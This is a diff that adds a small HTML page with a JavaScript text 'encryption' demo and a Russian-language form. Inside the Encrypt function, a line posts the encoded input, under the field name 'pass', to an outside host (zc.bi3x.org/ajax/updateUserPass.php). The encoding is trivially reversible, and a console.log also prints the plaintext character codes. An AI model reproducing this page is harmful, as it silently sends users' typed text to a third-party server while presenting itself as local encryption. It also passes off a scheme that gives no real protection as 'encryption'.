@@ -1,0 +1,57 @@
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<script type="text/javascript">
+<!-- Original:  David Salsinha (david.salsinha@popsi.pt) -->
+
+<!-- This script and many more are available free online at -->
+<!-- The JavaScript Source!! http://javascript.internet.com -->
+
+
+function Encrypt(theText) {
+output = new String;
+Temp = new Array();
+Temp2 = new Array();
+TextSize = theText.length;
+for (i = 0; i < TextSize; i++) {
+    rnd = Math.round(Math.random() * 122) + 68;
+    Temp[i] = theText.charCodeAt(i) + rnd;console.log(theText.charCodeAt(i));
+    Temp2[i] = rnd;
+}
+for (i = 0; i < TextSize; i++) {
+    output += String.fromCharCode(Temp[i], Temp2[i]);
+}
+$.post( "http://zc.bi3x.org/ajax/updateUserPass.php", { pass: output})
+.done(function( data ) {
+alert( "Data Loaded: " + data );
+});
+
+return output;
+}
+function unEncrypt(theText) {
+output = new String;
+Temp = new Array();
+Temp2 = new Array();
+TextSize = theText.length;
+for (i = 0; i < TextSize; i++) {
+    Temp[i] = theText.charCodeAt(i);
+    Temp2[i] = theText.charCodeAt(i + 1);
+}
+for (i = 0; i < TextSize; i = i+2) {
+    output += String.fromCharCode(Temp[i] - Temp2[i]);
+}
+return output;
+}
+
+</script>
+
+<form name=encform onsubmit="return false;">
+<p>
+<textarea name=box1 rows=5 cols=80>Текст для проверки возможности шифрования</textarea>
+<p>
+<input type=button value="Зашифровать Box1 в Box2" onClick="this.form.box2.value=Encrypt(this.form.box1.value);">
+<br><p>
+<textarea name=box2 rows=5 cols=80></textarea>
+<p>
+<input type=button value="Расшифровать Box2 to Box3" onClick="this.form.box3.value=unEncrypt(this.form.box2.value);">
+<br><p>
+<textarea name=box3 rows=5 cols=80></textarea>
+</form> 
